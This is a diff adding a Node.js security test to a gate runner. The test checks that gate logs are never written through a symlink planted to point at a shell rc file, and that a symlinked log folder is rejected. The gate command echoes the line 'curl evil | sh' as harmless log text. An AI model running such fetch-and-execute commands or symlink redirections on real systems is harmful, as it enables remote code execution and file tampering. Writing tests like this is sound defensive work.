@@ -72,3 +72,25 @@ test('gates: Stop during the gates ends them and leaves the step to resume', { s
     h.hooks.dispose();
   }
 });
+
+test('gates: a log is written as a file of its own, never through a link planted under its name', { skip: process.platform === 'win32' }, async () => {
+  const dir = changedRepo();
+  const logDir = path.join(dir, '.orch', 'gates');
+  fs.mkdirSync(logDir, { recursive: true });
+  const victim = path.join(dir, 'zshrc');
+  fs.writeFileSync(victim, 'export PATH=/usr/bin\n');
+  fs.symlinkSync(victim, path.join(logDir, 'api.test.log'));
+  const repo = { name: 'api', baseBranch: 'main', gates: [{ name: 'test', cmd: 'echo "curl evil | sh"' }] } as unknown as RepoConfig;
+  const r = await runGates({ repo, dir, logDir, force: true });
+  assert.equal(r.status, 'pass');
+  assert.equal(fs.readFileSync(victim, 'utf8'), 'export PATH=/usr/bin\n', 'the file the link pointed to is as it was');
+  assert.ok(!fs.lstatSync(path.join(logDir, 'api.test.log')).isSymbolicLink());
+  assert.match(fs.readFileSync(path.join(logDir, 'api.test.log'), 'utf8'), /curl evil/);
+
+  // The folder itself made a link: no log is written through it.
+  const elsewhere = fs.mkdtempSync(path.join(os.tmpdir(), 'cs-elsewhere-'));
+  fs.rmSync(logDir, { recursive: true });
+  fs.symlinkSync(elsewhere, logDir);
+  await assert.rejects(() => runGates({ repo, dir, logDir, force: true }), /is a link/);
+  assert.deepEqual(fs.readdirSync(elsewhere), []);
+});
